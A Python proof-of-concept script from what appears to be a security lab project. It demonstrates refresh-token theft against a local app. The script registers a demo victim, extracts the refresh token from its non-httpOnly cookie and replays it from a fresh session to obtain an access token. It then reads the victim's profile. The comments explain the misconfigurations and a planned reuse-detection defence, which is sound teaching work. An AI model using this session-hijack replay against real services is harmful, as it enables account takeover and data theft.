#!/usr/bin/env python3
"""
token_theft.py — VULN-07: Refresh Token Theft

Two misconfigurations introduced in Phase 05 make refresh token theft
trivially easy:

  1. httpOnly: false  — the refresh token cookie is readable by JavaScript,
                        meaning any XSS payload or malicious script on the
                        page can steal it with document.cookie.

  2. 30-day expiry    — once stolen, the token stays valid for up to 30 days
                        with no way for the victim to know their session has
                        been compromised.

The rotation mechanism was intentionally kept intact (it was part of the
secure baseline). This matters: in Phase 07, refresh token REUSE detection
will be built on top of that rotation, making it the standout detection
feature of the project.

Attack simulation:
  Step 1 — Victim logs in normally → receives a refresh token in a cookie
  Step 2 — Attacker "steals" that cookie value (simulating XSS extraction
            via document.cookie — we extract it from the Set-Cookie header
            here since we're in Python, not a browser)
  Step 3 — Attacker sends POST /api/auth/refresh with the stolen token
            in a new session (no victim cookies, fresh client) → receives
            a brand-new access token
  Step 4 — Attacker uses that access token to call GET /api/users,
            confirming full authenticated access as the victim

This script creates its own victim account (self-registered) so it's
fully self-contained — no dependency on other cached files.

Usage:
    python token_theft.py
"""

import base64
import json
import os
import sys

import requests

DEFAULT_BASE_URL = "http://localhost:5001"
REGISTER_PATH = "/api/auth/register"
LOGIN_PATH = "/api/auth/login"
REFRESH_PATH = "/api/auth/refresh"
USERS_PATH = "/api/users"


def decode_jwt_payload(token: str) -> dict:
    try:
        payload_b64 = token.split(".")[1]
        padding = "=" * (-len(payload_b64) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
    except Exception:
        return {}

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


def run(base_url: str = DEFAULT_BASE_URL):
    base = base_url.rstrip("/")

    # -------------------------------------------------------------------
    # Step 1 — Register and log in as a victim
    # -------------------------------------------------------------------
    print("=" * 65)
    print("Step 1 — Victim logs in (refresh token issued)")
    print("=" * 65)

    victim_email = "victim_demo@example.com"
    victim_password = "VictimPass99"
    victim_username = "victim_demo"

    # Register (ignore error if already exists)
    requests.post(f"{base}{REGISTER_PATH}", json={
        "username": victim_username,
        "email": victim_email,
        "password": victim_password,
    }, timeout=10)

    # Log in — use a Session to capture the cookie
    victim_session = requests.Session()
    r = victim_session.post(f"{base}{LOGIN_PATH}", json={
        "email": victim_email,
        "password": victim_password,
    }, timeout=10)

    if r.status_code != 200:
        print(f"[!] Victim login failed: HTTP {r.status_code} — {r.text}")
        sys.exit(1)

    victim_access_token = r.json().get("accessToken") or r.json().get("token")
    print(f"[*] Victim logged in: {victim_email}")
    print(f"[*] Victim access token (first 40 chars): {victim_access_token[:40]}...")

    # Extract the refresh token from the Set-Cookie header
    # In a real attack this is done via document.cookie in JS (httpOnly:false)
    set_cookie = r.headers.get("Set-Cookie", "")
    refresh_token = None
    for part in set_cookie.split(";"):
        part = part.strip()
        if part.startswith("refreshToken="):
            refresh_token = part.split("=", 1)[1]
            break

    # Also check the session's cookie jar as fallback
    if not refresh_token:
        refresh_token = victim_session.cookies.get("refreshToken")

    if not refresh_token:
        print("[!] Could not extract refresh token from response.")
        print(f"    Set-Cookie header: {set_cookie[:300]}")
        print("    Check that httpOnly:false is still set in your auth controller.")
        sys.exit(1)

    print(f"\n[+] REFRESH TOKEN STOLEN (simulating document.cookie extraction):")
    print(f"    {refresh_token[:60]}...")
    print(f"\n    In a browser with httpOnly:false, any script on the page can")
    print(f"    read this with: document.cookie  — no special permissions needed.")

    # -------------------------------------------------------------------
    # Step 2 — Attacker replays stolen token from a fresh client
    # -------------------------------------------------------------------
    print()
    print("=" * 65)
    print("Step 2 — Attacker replays stolen token (new client, no victim cookies)")
    print("=" * 65)
    print(f"[*] Sending POST {REFRESH_PATH} with stolen refreshToken cookie")
    print(f"[*] Using a brand-new requests.Session() — no victim cookies")

    attacker_session = requests.Session()
    attacker_session.cookies.set("refreshToken", refresh_token)

    r = attacker_session.post(f"{base}{REFRESH_PATH}", timeout=10)

    print(f"[*] HTTP {r.status_code}")

    if r.status_code != 200:
        print(f"[!] Refresh failed: {r.text}")
        print("    The token may have already been rotated — try again immediately")
        print("    after Step 1 completes.")
        sys.exit(1)

    attacker_access_token = r.json().get("accessToken") or r.json().get("token")
    print(f"\n[+] REFRESH SUCCEEDED — attacker now holds a valid access token:")
    print(f"    {attacker_access_token[:60]}...")
    print(f"\n    The victim's session has just been silently hijacked.")
    print(f"    The attacker has a fresh 1-hour access token and a new")
    print(f"    refresh token — persistent access for up to 30 days.")

    # -------------------------------------------------------------------
    # Step 3 — Attacker uses the token to call a protected endpoint
    # -------------------------------------------------------------------
    print()
    print("=" * 65)
    print("Step 3 — Attacker uses stolen session to call a protected endpoint")
    print("=" * 65)

    # Decode the token to get the victim's user ID, then call
    # GET /api/users/:id — requires only a valid JWT (any role).
    claims = decode_jwt_payload(attacker_access_token)
    victim_id = claims.get("id") or claims.get("_id") or claims.get("userId")

    endpoint = f"{USERS_PATH}/{victim_id}" if victim_id else USERS_PATH
    print(f"[*] Calling GET {endpoint} with attacker's obtained access token")

    r = requests.get(
        f"{base}{endpoint}",
        headers={"Authorization": f"Bearer {attacker_access_token}"},
        timeout=10,
    )

    print(f"[*] HTTP {r.status_code}")

    if r.status_code == 200:
        body = r.json()
        # Response could be a single user object or a list
        if isinstance(body, list):
            print(f"\n[+] SESSION HIJACK CONFIRMED — attacker read {len(body)} user records")
        else:
            print(f"\n[+] SESSION HIJACK CONFIRMED — attacker read victim's profile:")
            print(f"    username : {body.get('username')}")
            print(f"    email    : {body.get('email')}")
            print(f"    role     : {body.get('role')}")
            pw = body.get('password', '')
            print(f"    password : {pw[:30]}..." if pw else "    password : (not returned)")
        print()
        print("    This confirms the stolen refresh token granted a fully working")
        print("    authenticated session — the attacker has the same API access")
        print("    as the legitimate victim.")
    else:
        print(f"[!] Unexpected response: {r.text[:200]}")

    # -------------------------------------------------------------------
    # Summary
    # -------------------------------------------------------------------
    print()
    print("=" * 65)
    print("SUMMARY — VULN-07: Refresh Token Theft")
    print("=" * 65)
    print("  Root causes:")
    print("    httpOnly: false  — refresh token readable by any JS on the page")
    print("    maxAge: 30 days  — stolen token grants access for up to 30 days")
    print()
    print("  What makes this worse:")
    print("    The victim has no way to detect the theft. Their own session")
    print("    still works (rotation issued them a new refresh token too).")
    print("    The attacker's forked session runs silently in parallel.")
    print()
    print("  Coming in Phase 07:")
    print("    Refresh token REUSE detection — if the attacker tries to use")
    print("    an already-rotated token, the server detects the reuse and")
    print("    immediately revokes the entire token family, killing both")
    print("    the attacker's session AND alerting on the compromise.")


if __name__ == "__main__":
    run()